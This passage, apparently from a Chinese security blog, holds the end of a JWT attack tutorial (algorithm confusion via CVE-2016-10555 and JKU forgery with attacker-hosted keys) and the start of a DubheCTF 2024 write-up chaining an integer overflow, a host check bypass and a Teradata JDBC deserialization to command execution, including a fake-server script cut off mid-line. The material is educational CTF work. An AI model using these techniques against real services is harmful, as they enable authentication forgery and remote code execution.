punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">let</span> obj <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>token<span class="token punctuation">,</span> publicKey<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span>role <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                        <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'welcome admin'</span><span class="token punctuation">,</span>                        <span class="token string-property property">'flag'</span><span class="token operator">:</span> flag<span class="token punctuation">,</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                        <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'you are not admin'</span><span class="token punctuation">,</span>                    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                    <span class="token string-property property">'err'</span><span class="token operator">:</span> err                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'unauthorized'</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening at :3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>程序使⽤了 jwt-simple 库, 版本为 0.5.1, 该版本存在 CVE-2016-10555 漏洞, 即可以将 JWT 的算法从 RS256 改成 HS256, 使得程序使⽤ RSA 公钥, 以 HS256 算法对 JWT 进⾏验证, ⽽ &#x2F;getpubkey 路由正好会泄露公钥, 因此整个利⽤过程如下</p><p>⾸先拿到公钥</p><p>然后将公钥作为 HMAC secret, 构造 JWT, 注意勾选 secret base64 encoded<br><img src="image-6.png" alt="image-6.png"></p><p>最后访问 &#x2F;admin 路由拿到 flag</p><h2 id="4-JKU-地址伪造"><a href="#4-JKU-地址伪造" class="headerlink" title="4. JKU 地址伪造"></a>4. JKU 地址伪造</h2><p>在 JWT 的相关规范中, 存在 JWK 和 JKU 的概念, JWK 即 JSON Web Key, 是⼀个 JSON 对象, 表示⽤于加密&#x2F;签名的密钥 (⼀般为 RSA 算法)</p><p>⽽ JKU (JSON Web Key Set URL) 是 JWT Header 的⼀个字段, ⽤于指定 JWK ⽂件所在的 URL 地址</p><p>⼀个很经典的场景是某系统存在多个服务器均需要对⽤户请求的 JWT 进⾏验证, ⽽ JWK 密钥会定期更新, 如果直接将 JWK 以⽂件的形式复制多份放在不同的服务器上, 显然很不⽅便, 这时候就需要⼀个专⻔⽤于存放 JWK 的可信任的服务器 (JKU), 之后只需请求 JKU 地址即可拿到最新的 JWK, 然后再进⾏ JWT 的验证, 这样会⽅便很多</p><p>尽管如此, 但部分程序会强依赖于 Header 中的 JKU 进⾏签名的验证, 导致我们可以尝试将 JKU 指向恶意的 URL 地址, 即可使⽤我们已知的 JWK 密钥对 JWT 进⾏验证, 从⽽构造任意内容的 JWT</p><p>eg.</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> jwksClient <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jwks-rsa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> flag <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token string">'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QifQ.X8CEnicXPdsIk_P0V - wM8EElKL8FyKSi7aE - _p11oLsQzvR48mEk92jeS9E8 iJpSO1gcz8gUVSZvDS2Ne0cGIc86O4aZphVG - uZYydYVctZT - ho7vRuflOK9uNVf7SNnjEcxi TP5 - driA547Dc_v6zPqfBrSid2kLQElsYKIlklwJX0H - qHTNjClrxh9fFkIe1d_MSksrYahVX SCsxi0mm3JPVwK8NjdPKNHEWLCw0DR2HaK64SUDFbE9wucYQCo4L6HBBF2hg4KRXIgBApHIoG jFrdM5BB7z0nXWqZpxuF_DjvzNiMwPbPWpEV02bQa6j52zg3o0DYGXRFLu1FtQA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'hello world'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/static/jwks.json'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">'./jwks.json'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">root</span><span class="token operator">:</span> __dirname<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>token<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> decoded <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>token<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">complete</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> client <span class="token operator">=</span> <span class="token function">jwksClient</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token literal-property property">jwksUri</span><span class="token operator">:</span> decoded<span class="token punctuation">.</span>header<span class="token punctuation">.</span>jku <span class="token operator">??</span> <span class="token string">'http://127.0.0.1:80/static/ jwks.json'</span><span class="token punctuation">,</span>                <span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> key <span class="token operator">=</span> <span class="token keyword">await</span> client<span class="token punctuation">.</span><span class="token function">getSigningKey</span><span class="token punctuation">(</span>decoded<span class="token punctuation">.</span>header<span class="token punctuation">.</span>kid <span class="token operator">??</span> <span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> pubKey <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">getPublicKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> data <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>token<span class="token punctuation">,</span> pubKey<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>role <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                    <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'welcome admin'</span><span class="token punctuation">,</span>                    <span class="token string-property property">'flag'</span><span class="token operator">:</span> flag                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                    <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'you are not admin'</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token string-property property">'err'</span><span class="token operator">:</span> err            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token string-property property">'msg'</span><span class="token operator">:</span> <span class="token string">'unauthorized'</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening at :80'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>程序默认发送⼀个已经签名好的 jwt, 同时 JWK 密钥已知</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"keys"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"kty"</span><span class="token operator">:</span> <span class="token string">"RSA"</span><span class="token punctuation">,</span>            <span class="token property">"e"</span><span class="token operator">:</span> <span class="token string">"AQAB"</span><span class="token punctuation">,</span>            <span class="token property">"use"</span><span class="token operator">:</span> <span class="token string">"sig"</span><span class="token punctuation">,</span>            <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"RS256"</span><span class="token punctuation">,</span>            <span class="token property">"kid"</span><span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>            <span class="token property">"n"</span><span class="token operator">:</span> <span class="token string">"mvZIyoISigFRl86lzZoIRrx6RUek5C-de0HqnitsrZ1mD4Box6Ko8Bt6YroUQda7ickhFwc9Ldxtgcms3Q_zoBtXOHYgq9ym6BPl275ZOD-kOpHOCtMrRPe5KO66bdT4uhKab4Pu1KExfmPEVn6jf7Plo_NTmR6MP8H3nn8_z8NroSNwNe_Lf7AKVeVm-Ys0hPbpr5RbFeKt2EXMIUScQrvTLgOfRil6lT-KFhloWBvzo91OGtGdwAZr99woolkPtOfHxyoboc-zGdWsIVR2Q6cGyXY2dbsq-rwOleY9Vc0PVSj9uVm96c3Z8G1q84hOxaIY8QxziuWWcE4q7_8Blw"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p>但是这⾥的 JWK 仅仅是 RSA 的公钥, 只能⽤于验证, 不能⽤于签名</p><p>仔细阅读代码可以发现程序会通过 JWT Header 中提供的 JKU 地址来获取 JWK, 那么我们就可以搭建⼀个可控的服务器来托管我们⾃⼰的 JWK, 进⽽伪造 admin 的权限</p><p>⾸先利⽤ mkjwk ⽣成 JWK<br><img src="image-7.png" alt="image-7.png"></p><p>构造 jwks.json</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"keys"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"kty"</span><span class="token operator">:</span> <span class="token string">"RSA"</span><span class="token punctuation">,</span>            <span class="token property">"e"</span><span class="token operator">:</span> <span class="token string">"AQAB"</span><span class="token punctuation">,</span>            <span class="token property">"use"</span><span class="token operator">:</span> <span class="token string">"sig"</span><span class="token punctuation">,</span>            <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"RS256"</span><span class="token punctuation">,</span>            <span class="token property">"kid"</span><span class="token operator">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span>            <span class="token property">"n"</span><span class="token operator">:</span> <span class="token string">"2QTsyirNootelqW9xfKtSrxFRE2G_1VA8wnD6YbXwJNmpgrWQo2eJPR4HpGoKJphawL8xuYbdbzVStt9MnlENlCxFv8F5jlbGgn6cD0AOgRV9WrQh9GqLHWBZKNhoTXa9KCPAHjprclu_Lt9-u3DgsoJoI9v8_oOPd7XNPIEQKP7U9rJPQPVOUP1JQ4zBWpdNHkjY0Qbok8PsTAX2u5o6XbhQIG_2mU-RXoZutdOv5Os1Uh0q-jSeWDn6OiaixvkPtAZxCIiXniOf_BtdsXVkobEhbj8kjjEx5XPJPwg9vz_wzticNqxkH4hkkGZLsrIavxpMkhyuyqPt2qaT0VyUQ"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span></code></pre><p>构造 JWT<br><img src="image-8.png" alt="image-8.png"><br>搭建 HTTP 服务器托管 jwks.json, 携带 JWT 访问 flag 路由, 拿到 flag</p>]]></content>
      
      
      <categories>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 DubheCTF WriteUp</title>
      <link href="/write-up/2024-dubhectf-writeup/"/>
      <url>/write-up/2024-dubhectf-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Javolution"><a href="#Javolution" class="headerlink" title="Javolution"></a>Javolution</h1><h2 id="反序列化部分入口点"><a href="#反序列化部分入口点" class="headerlink" title="反序列化部分入口点"></a>反序列化部分入口点</h2><p><img src="image-1.png" alt="image-1.png"></p><p><img src="image-2.png" alt="image-2.png"></p><p><img src="image-3.png" alt="image-3.png"></p><p>要到达触发反序列化语句部分，需要满足以下条件：</p><ul><li>Player 玩家等级达到50级</li><li>传入的 host 包含 <code>dubhe</code> 字段且是回环地址</li></ul><h2 id="一、整数溢出漏洞"><a href="#一、整数溢出漏洞" class="headerlink" title="一、整数溢出漏洞"></a>一、整数溢出漏洞</h2><p>jar 包内 <code>/pal</code> 路由部分实现了一个较为完整的交互式幻兽帕鲁游戏，提供以下操作接口：</p><ul><li><p><code>/capture</code> 用于捕捉帕鲁，仅当待捕捉帕鲁的等级在 Player 等级+10 级 以内才能捕捉成功</p><p>  捕捉成功后 Player 将变为被捕捉的帕鲁</p></li><li><p><code>/battle/&#123;boss&#125;</code> 路由用于与帕鲁战斗，通过一个特定的函数判断双方能力：</p></li></ul><p><img src="image-4.png" alt="image-4.png"></p><p>如果 Player 能力大于目标帕鲁的能力，则战斗成功，Player 等级升至目标帕鲁的等级</p><ul><li><p><code>/cheat</code> 在 GET 路由中可以修改当前 Player 的 hp、attack 和 defense，但需要满足</p><p>  <code>hp &lt;= level * 200</code> 、<code>attack &lt;= level * 20</code> 和 <code>defense &lt;= level * 20</code></p></li><li><p><code>/cheat</code> 在 POST 路由中用于触发 Java 反序列化，需要满足前述条件才能到达触发部分</p></li></ul><p>游戏部分提供了如下帕鲁：</p><p><img src="image-5.png" alt="image-5.png"></p><p>为了提供更高的游戏趣味性和随机性，游戏中还提供了如下生成波动函数：</p><p><img src="image-6.png" alt="image-6.png"></p><p><img src="image-7.png" alt="image-7.png"></p><p>和元素克制逻辑：</p><p><img src="image-8.png" alt="image-8.png"></p><p>由于出题人的精心设计：</p><ul><li>Grizzbolt 和 Jetragon 的等级差值为 20</li><li>初始值波动范围为 0.9 - 1.1</li><li>元素克制加成为 1.0 或 1.5</li><li><code>/cheat</code> GET路由部分的设置限制</li></ul><p>无法通过正常方法 <code>battle</code> 赢 Jetragon 或 <code>capture</code> 到 Jetragon</p><blockquote><p>💡 因此此处需要使用 整除溢出漏洞</p></blockquote><p>首先 <code>/cheat</code> 的 GET 路由部分使用了 <code>intValue()</code> 函数，且限制了传入数据为 <code>Integer</code> ，如果传入过大或过小的数字，会被当成字符串报错，所以此处是无法使用溢出漏洞的</p><p>因此考虑在后续对 hp attack 和 defense 的运算中使用整数溢出漏洞：</p><p><img src="image-9.png" alt="image-9.png"></p><p>由于 <code>/cheat</code> 的 GET 路由部分仅限制了 <code>hp &lt;= level * 200</code> 、<code>attack &lt;= level * 20</code> 和 <code>defense &lt;= level * 20</code> ，因此我们可以传入一个很小的但不溢出的负数：</p><pre class="language-jsx" data-language="jsx"><code class="language-jsx">hp<span class="token operator">=</span><span class="token number">0</span> attack<span class="token operator">=</span><span class="token operator">-</span><span class="token number">2147483648</span> defense<span class="token operator">=</span><span class="token operator">-</span><span class="token number">2147483648</span></code></pre><p>此时 <code>myPower</code> 由于 <code>hp=0</code> 而变为 0</p><p><code>opponentPower</code> 由于 <code>opponentdamage</code> 计算过程中发生溢出成为0 而变为0</p><p>因此最后得以 <code>battle</code> 成功升入 50 级</p><h2 id="二、host-绕过"><a href="#二、host-绕过" class="headerlink" title="二、host 绕过"></a>二、host 绕过</h2><p>该部分需要满足以下条件：</p><ul><li>传入的 host 包含 <code>dubhe</code> 字段</li><li>传入的 host 是回环地址</li></ul><p>可以通过设置一个公网 DNS 解析到回环地址来绕过，同时可能由于远程进行了相应设置，可以使用 <code>dubhe.localhost</code> 绕过校验部分</p><h2 id="三、反序列化部分"><a href="#三、反序列化部分" class="headerlink" title="三、反序列化部分"></a>三、反序列化部分</h2><p>反序列化入口点是一个常见的 <code>readObject()</code> 函数，查看 pom.xml 如下：</p><p><img src="image-10.png" alt="image-10.png"></p><p><img src="image-11.png" alt="image-11.png"></p><p>发现这是基于 Java 17 的高版本反序列化</p><p>由于依赖中没有提供常用的 CommonCollection 链和 CommonBeanutil 链，只能尝试从 Jackson 链尝试突破</p><p>且此处引入的 teradata jdbc 并没有在前述逻辑中使用，应当是绕过高版本 Java 限制的一个工具</p><p>先在 <code>com.teradata.jdbc</code> 包中进行危险函数的查找：</p><p><img src="image-12.png" alt="image-12.png"></p><p>发现在其原设计为调用浏览器的逻辑部分存在 <code>Runtime.getRuntime().exec()</code> 危险函数的调用</p><p>找了半天终于在 blackhat 里找到了相关的漏洞说明：</p><p><img src="image-13.png" alt="image-13.png"></p><p><img src="image-14.png" alt="image-14.png"></p><p>Teradata JDBC 在通过浏览器设置 SSO 登录时会调用 <code>Runtime.getRuntime().exec()</code> 用于启动指定的浏览器进行 SSO 验证，此处存在漏洞可进行任意命令执行</p><blockquote><p>攻击路径如下：</p><ol><li>JDBC Client 连接到 Fake Teradata Server</li><li>Fake Teradata Server 告诉 JDBC Client OIDC 已启用</li><li>JDBC Client 向 OIDC 服务器发出 URL 请求，需要具有 openid-configuration 格式的 JSON 返回</li><li>JDBC Client 执行 BROWSER 属性中的命令</li></ol></blockquote><p>首先启用一个 Fake Teradata Server：</p><p><img src="image-15.png" alt="image-15.png"></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Script fakeserver.py from Vidar-Team 1ue</span><span class="token keyword">import</span> asyncore<span class="token keyword">import</span> logging<span class="token keyword">import</span> socket<span class="token keyword">import</span> struct<span class="token keyword">class</span> <span class="token class-name">teradata_request_handler</span><span class="token punctuation">(</span>asyncore<span class="token punctuation">.</span>dispatcher_with_send<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> sock<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>        asyncore<span class="token punctuation">.</span>dispatcher_with_send<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> sock<span class="token operator">=</span>sock<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>addr <span class="token operator">=</span> addr        self<span class="token punctuation">.</span>packet_to_send <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'03020a0000070000'</span><span class="token punctuation">)</span><span class="token operator">+</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">H"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">899</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'000000000000000000000000000000000000000000010000000005ff0000000000000000000000000000002b024e000003e8000003e80078000177ff0000000200000001ff000004be00555446313620202020202020202020202020202020202020202020202020bf00555446382020202020202020202020202020202020202020202020202020ff00415343494920202020202020202020202020202020202020202020202020c0004542434449432020202020202020202020202020202020202020202020204e0100010001540007008c310000640000fa00000f4240000000007cff06000070000000fff80000000100000000bf000000100000ffff000008000000008000000040000009e7000fa0000000f23000007918000000260000fa000000fa000000fa0000007d0000007d000000fa000000fa00000009e7000000060000000600000006000003e8000fa00000fffc00000fffb40000fa000009000101000a001c01010101010101020100010100010101010201010001010101010102000b002201010101010001010101010102010101010101010001010101010101010001010000000c0006010001020101000d003e31372e32302e30332e30392020202020202020202020202020202020202031372e32302e30332e3039202020202020202020202020202020202020202020000e000403030203000f00280100000100010100000101000001000100010001000000000000000000000001010001000100000100100014000000000000000000008002000000000000000000120020010101010101010100000000000000000000000000000000000000000000000000130008010101000000000000060002014900a5'</span><span class="token punctuation">)</span><span class="token operator">+</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">H"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">87</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'0000000100010005010002000811140309000300040004000600210006000400050004000700040008000400090004000a000501000b000501000c000501000e0004001000060100000f'</span><span class="token punctuation">)</span><span class="token operator">+</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">H"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'000372636500'</span><span class="token punctuation">)</span><span class="token operator">+</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>url<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'00a70031000000010000000d2b06010401813f0187740101090010000c00000003000000010011000c000000010000001400a70024000000010000000c2b06010401813f01877401140011000c000000010000004600a7002100000001000000092a864886f7120102020011000c000000010000002800a7001e00000001000000062b06010505020011000c000000010000004100a70025000000010000000d2b0601040181e01a04822e01040011000c000000010000001e00a70025000000010000000d2b0601040181e01a04822e01030011000c000000010000000a'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ibuffer <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">handle_read</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8192</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token punctuation">:</span>            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'[+]Data received: &#123;&#125;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'[+]Data sending: &#123;&#125;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>packet_to_send<span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>self<span class="token punctuation">.</span>packet_to_send<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">TeradataServer</span><span class="token punctuation">(</span>asyncore<span class="token punctuation">.</span>dispatcher<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>        asyncore<span class="token punctuation">.</span>dispatcher<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>create_socket<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>set_reuse_addr<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        logging<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'Server running on </span><span class="token interpolation"><span 